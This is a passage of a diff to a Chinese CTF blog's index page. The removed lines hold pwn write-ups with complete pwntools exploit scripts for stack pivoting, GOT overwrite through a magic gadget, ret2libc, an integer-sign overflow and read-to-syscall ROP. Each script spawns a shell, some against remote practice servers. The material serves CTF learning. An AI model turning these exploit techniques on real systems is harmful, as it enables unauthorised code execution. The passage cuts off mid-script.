class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment">#result=local_search(&#x27;puts&#x27;,puts_addr,libc)</span></span><br><span class="line">result =long_search(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sys_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(bin_sh_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<img src="https://s2.loli.net/2022/05/27/91AutEp7wzOoacL.png" alt="image-20220526001630304" style="zoom:33%;" />
+          <h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><p>考察的是最简单的arm架构的栈溢出。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/4354d4bf.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -833,7 +386,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:39:39" itemprop="dateModified" datetime="2023-07-01T19:39:39+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -855,47 +408,20 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习和收获有：</p>
+          <p>通过这道题的学习和收获有：</p>
 <p>1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。</p>
 <p>2、利用magic gadget修改got表</p>
 <p>3、这道题的核心考察的就是栈迁移以及payload布局。</p>
 <p>4、取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为负，则加0x100000000取补码。</p>
 <p>5、如果可以的话，迁移到bss段尽量迁移到地址高一点的地方。这次打远程的那个exp就是因为bss段迁移的太低了，因为是破坏了某些数据，导致最后执行system函数的时候卡住了。</p>
-<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220328113024633-1772975266.png"></p>
-<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p><img src="/../img/2706180-20220328113036736-1992703946.png"></p>
-<p>可以发现，这道题就一个输入函数，没有输出函数，不过这个read具有16字节的溢出。这个没什么好想的，直接就栈迁移了。</p>
-<p>然后输出函数也没有，泄露栈基地址这种情况就排除了，那就只能迁移到bss段。</p>
-<p>先考虑一点，溢出16个字节仅仅只能去迁移，我们似乎没有办法去bss段布置数据。不过观察了一下汇编代码，发现read函数的第二个参数是由rbp确定的。</p>
-<p><img src="/../img/2706180-20220328113048327-1891287888.png"></p>
-<p>而我们可以利用溢出来控制rbp，因此就相当于可以控制read的输入的地方了，控制完rbp的话，只能在控制一个返回地址，既然控制rbp就已经相当于控制rsi了，那就返回0x4011BF再读一次（此时的read输入的地址已经是bss段了）。<strong>选取往bss段输入的内容，一定要把地址抬高，我最开始选择的是往0x404100这里写入数据再迁移，到了最后执行system的过程中给卡死了</strong></p>
-<p>read结束之后，又到了leave;ret指令。<strong>leave指令就是mov rsp;rbp  pop rbp</strong>；</p>
-<p>执行leave指令的时候，我们的rbp是什么？是我们要控制read函数的rsi来设定的rbp（它现在是bss段地址）</p>
-<p>我还是用实际的数据来举例一下吧。假设我第一次控制rbp为（0x404600+0xa0），那rsi的值就是0x404600（因为buf为-0xa0）（即我们输入的数据是从0x404600处开始输入的）我们可以输入0xB0个数据，因此在0x404600+0xa0这个地方写入0x404600。</p>
-<p>此时执行read结束后的leave指令是什么情况？（如下图）</p>
-<p><img src="/../img/2706180-20220328113100100-154096690.png"></p>
-<p><img src="/../img/2706180-20220328113111922-1348637698.png"></p>
-<p><img src="/../img/2706180-20220328113121870-416873327.png"></p>
-<p><img src="/../img/2706180-20220328113132111-1383092616.png"></p>
-<p>总结一下上面的过程，<strong>原本read读入完我们的数据，<font color=#FF0000 >rbp指向的才是我们想跳转的地方（并非rbp本身）</font>而rbp本身距离我们想跳转的还有0xa0个字节，不过至少rbp就在bss段，执行了第一次leave之后，<font color=#FF0000 >rsp也就变成了rbp的值（同时由于pop rbp，此时的rbp又变成了rbp当初所指向的内容）</font>，此时已经迁移到bss段了（只不过我们还要再迁移到我们布置的数据那里）因此再来一次leave（这个是第二次read输入过去的），由于leave里的mov rsp,rbp，rsp再次被改变，最后完成了迁移（迁移到了我们布置在bss段里的数据）</strong></p>
-<p>至此的话，大体框架就已经完成了。</p>
-<p><strong>剩下的就是在bss段中布局payload了，本地的话非常简单，用magic gadget去将setvbuf函数地址修改为one_gadget地址，然后调用一下setvbuf就完事了。远程的话，roderick师傅给我说，因为动态库的原因，one_gadget用不了，因此只能把setvbuf改成puts函数，然后再劫持程序执行流，完成ret2libc。</strong></p>
-<p>这里先简单说一下magic gadget吧，用ROPgadget –binary checkin –opcode 015dc3  去搜这个gadget的地址。015dc3是这个gadget的机器码（IDA里是看不见的，因为这个是机器码错位得到的）。</p>
-<p>这个gadget长这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure>
-
-<p>核心是在第一行的add上，我们可以利用ret2csu控制rbp和rbx，由此就可以用这个修改函数的got表。以这道题为例，我现在想将setvbuf的真实地址改成one_gadget地址，只需要将rbp-0x3d写成setvbuf的got地址，将ebx放成setvbuf和one_gadget二者在libc库中的偏移即可。再调用这个one_gadget，即可完成修改got表。</p>
-<p>这个magic gadget威力还是很大的，关于magic_gadget详细解释，我写在了这篇博客上  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p>
-<p>一句话概括本题思路，利用栈迁移到bss段，调试布置payload，利用magic gadget修改setvbuf got表为打印函数，最后ret2libc即可。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>这是打本地的，用的one_gadget。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404100</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(<span class="number">0x8905c</span>)<span class="comment">#这个0x8905c为setvbuf和one_gadget二者地址在libc库中的差值</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404100</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>比赛结束，远程的环境关闭了，不过roderick师傅远程打通了，我按照他这个思路写的，动态库换成比赛给的2.31，然后改成remote，远程也是ok的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27544)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_off=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_off=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_off))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(setvbuf_off))</span><br><span class="line">pop_rbp_addr=<span class="number">0x40113d</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404600</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401253</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> puts_off&gt;setvbuf_off:</span><br><span class="line">    offset=puts_off-setvbuf_off</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    offset=puts_off-setvbuf_off+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(offset)<span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(read_got_addr)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload+=p64(pop_rbp_addr)<span class="comment">#让rbp去指向0x404600（但是rbp本身是0x4046a0)，这样read结束之后触发了第一次leave，就让rsp的值为0x4046a8（这个地址指向的就是leave;ret）（此时rbp由于pop rbp，自身的值变成了0x404600），然后到ret，再次执行了leave;ret</span></span><br><span class="line"><span class="comment">#第二次leave，rsp才算变成了0x404608，然后ret实现了转移至布置到的system处。</span></span><br><span class="line">payload+=p64(<span class="number">0x404600</span>+<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4011BF</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404600</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(ret_addr)<span class="comment">#这道题需要栈对齐，具体细节我的另一篇博客上有讲。</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bin_sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>如果不太理解exp为什么这样写，就多调试N遍（我光调试这远程一个脚本从写到各种调试再到打通再到彻底理解，调试了73遍…)，总会有所收获的。<br>本人就一菜狗，如果写的有错误的地方，欢迎指正</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/59b6daad.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -957,7 +483,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:42:11" itemprop="dateModified" datetime="2023-07-01T19:42:11+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -979,30 +505,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h1><h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/image-20221007211754434.png" alt="image-20221007211754434"></p>
-<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><p><img src="/../img/image-20221007211805698.png" alt="image-20221007211805698"></p>
-<p>可以选择1，进行输入，并且这里存在了大量的溢出。</p>
-<p>选择2，则是将一个随机数打印出来(这道题其实就相当于人工构造了一个canary)，不过打印出来之后会重新存入一个新的随机数。</p>
-<p>选择3就会退出while的无限循环。</p>
-<p>最后main函数返回的时候有一个检查如下</p>
-<p><img src="/../img/image-20221007211843931.png" alt="image-20221007211843931"></p>
-<p>如果v2不等于生成的随机数的话(也就是溢出时覆盖了v2)，程序就会exit。也就是说前面溢出控制的返回地址也没用了。同时v2是可以被read输入的数据覆盖的。</p>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>这道题的思路就是通过随机数的检查，因此要么修改v2，要么修改0x4040d0上的随机数。因为这道题不可能输入到0x4040d0上，所以只考虑怎么修改v2的值为随机数。</p>
-<p>唯一的方法就是选择1进行溢出返回地址后，<strong>再执行一次2将随机数打印出来，同时新的随机数又写到了v2。</strong></p>
-<p>最后选择3后成功通过了随机数的检查，然后控制程序执行流即可。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27117</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">back_door=<span class="number">0x401577</span></span><br><span class="line">payload=(<span class="number">0x70</span>+<span class="number">8</span>)*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x401589</span>)+p64(back_door)</span><br><span class="line"><span class="comment">#debug(p,0x401525,0x4014A9)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me the code:\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007211858489.png" alt="image-20221007211858489"></p>
-<h1 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h1><h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a>保护策略:</h2><p><img src="/../img/image-20221007211615854.png" alt="image-20221007211615854"></p>
-<h2 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h2><p><img src="/../img/image-20221007211628523.png" alt="image-20221007211628523"></p>
-<p>在vul函数中，a1的类型为int，但是read输入的时候强转成了unsigned int。这就意味着输入-1的话，read的第三个参数将变成0xffffffff,由于没有canary保护，所以这里就嘎嘎溢出了。</p>
-<h2 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h2><p>用strncpy把&#x2F;bin&#x2F;sh\x00复制到bss段上，由于存在后门函数，然后read溢出劫持执行流即可获取shell。</p>
-<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_plt_addr=e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400983</span> </span><br><span class="line">bss_addr=<span class="number">0x6010C0</span></span><br><span class="line">leave_ret=<span class="number">0x400914</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;go\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x4007E8)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x400807</span>)+p64(pop_rdi_addr)+p64(bss_addr)+p64(sys_plt_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007211651058.png" alt="image-20221007211651058">】</p>
-
+          <p>赛题WP</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/e4b35f09.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1064,7 +575,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-28 12:13:43" itemprop="dateModified" datetime="2022-10-28T12:13:43+08:00">2022-10-28</time>
+      <time title="修改时间：2023-07-01 19:49:46" itemprop="dateModified" datetime="2023-07-01T19:49:46+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1086,118 +597,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面:"></a>写在前面:</h2><p>这次比赛放了三道pwn，做起来还是蛮吃力的，shellcode那题还是经过师傅们提示才做出来的，R()P这题到比赛结束也没有做出来。通过这次比赛感觉自己对于汇编中的gadget理解和利用还是有写不足，在此写下wp记录一下解题的过程。</p>
-<h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="../img/image-20221024192426317.png" alt="image-20221024192426317" style="zoom:50%;" />
-
-<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221024192010191.png" alt="image-20221024192010191"></p>
-<p>代码非常的简单，就一个栈溢出漏洞，没有canary，可以随便溢。</p>
-<p>最开始有个判断，buf&gt;0x100的话就会进入main函数递归，这里就是一个干扰的点，我们第一次直接发送一个\x00即可绕过这个检查。</p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>尽管代码非常短，但是利用起来有些麻烦。首先这道题就给了read函数，因此后续的利用就需要先篡改read的got表为syscall，然后控制rax为59，执行execve(“&#x2F;bin&#x2F;sh\x00”,0,0)</p>
-<h4 id="篡改read的got表"><a href="#篡改read的got表" class="headerlink" title="篡改read的got表"></a>篡改read的got表</h4><p>想要篡改read的got表，肯定是需要向read got写入数据，因此怎么控制read的rsi成了一个问题，我们需要去观察汇编代码（如下）</p>
-<p><img src="/../img/image-20221024193207882.png" alt="image-20221024193207882"></p>
-<p>我们在第二个read输入后，eax的值会被[rsp+0xc]所赋值，因此如果我们精心构造栈里的数据，那么就可以控制eax，而后我们劫持执行流如果返回到0x40115a处，执行mov rsi,rax的话，就会将rax的值赋给rsi，然后再执行read，如此我们就控制了rsi，实现了read的任意写入，进行read的got表篡改。因为read函数距离syscall非常近(如下)，只差了0x10的偏移，因此我们只需要输入一个字节0x90即可将read的got表改为syscall的地址(我使用的glibc是2.35的)</p>
-<p><img src="/../img/image-20221024193750318.png" alt="image-20221024193750318"></p>
-<p>篡改后的情况如下：</p>
-<p><img src="/../img/image-20221024194055530.png" alt="image-20221024194055530"></p>
-<h4 id="将-x2F-bin-x2F-sh写入bss段"><a href="#将-x2F-bin-x2F-sh写入bss段" class="headerlink" title="将&#x2F;bin&#x2F;sh写入bss段"></a>将&#x2F;bin&#x2F;sh写入bss段</h4><p> 现在仅仅有了syscall，我们还需要&#x2F;bin&#x2F;sh字符串的地址，因此我们需要将该字符串布置到bss段（还是上面的方法，控制rax寄存器，跳转回0x40115a），同时查看ROPgadget发现下面的这个gadget</p>
-<p><img src="/../img/image-20221024194558939.png" alt="image-20221024194558939"></p>
-<p>这个0x404018就是bss段上的地址，因此我们将&#x2F;bin&#x2F;sh写到0x404018，再控制好rax(继续控制执行流)，直接去执行这个gadget，即可成功布局好rdi的值。</p>
-<h4 id="控制rdx寄存器"><a href="#控制rdx寄存器" class="headerlink" title="控制rdx寄存器"></a>控制rdx寄存器</h4><p>上面虽然提到了怎么控制rdi寄存器，但是我们要先布局好rdx的值，才能去布置rdi寄存器，这个顺序不能错。原因如下：</p>
-<p><img src="/../img/image-20221024195251658.png" alt="image-20221024195251658"></p>
-<p>我们控制edx寄存器，必须通过上图的gadget，但是如果执行这个gadget就务必让edi清零了，因此我们只能先让edx变成0，再去布置rdi的值。</p>
-<p>这里的思路就是让程序的执行流返回到0x40115d，因为edx是从栈里给的(而我们又能控制栈里的数据，变相的就控制了栈里的数据)，然后将edx置成0，而接下来的read函数执行时，虽然rdx是0也没有关系，顶多就是写不进去数据而已。</p>
-<h4 id="控制rdi寄存器"><a href="#控制rdi寄存器" class="headerlink" title="控制rdi寄存器"></a>控制rdi寄存器</h4><p>控制rdi寄存器所需要的gadget是<code>mov edi, 0x404018 ; jmp rax</code>,在这之前我们需要将rax改成一个地址，才能保证执行流不会断，所以在刚刚提到的控制rdx寄存器的部分，最后应该让执行流到0x40116d这个地址，去控制rax，然后去跳转到<code>mov edi, 0x404018 ; jmp rax</code>上。</p>
-<p>执行完这段gadget我们的rdi和rdx都控制完了，而rsi最后可以控制，因此我们还需要控制下rax，控制rax的gadget就是0x40116d。所以我们先将rax的值设置为0x40116d，这样最后就会jmp过去</p>
-<h4 id="控制rax-rsi寄存器"><a href="#控制rax-rsi寄存器" class="headerlink" title="控制rax,rsi寄存器"></a>控制rax,rsi寄存器</h4><p>又跳转到了0x40116d的位置，我们先控制rax的值为59，然后去跳转到0x401141地址处，最后控制下rsi的值，开始执行read函数时，因为read的got表已经被篡改为了syscall，我们参数全部布置好了，到此即可获取shell(如下)</p>
-<p><img src="/../img/image-20221024201001179.png" alt="image-20221024201001179"></p>
-<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26579&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x401168</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(e.got[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#second read 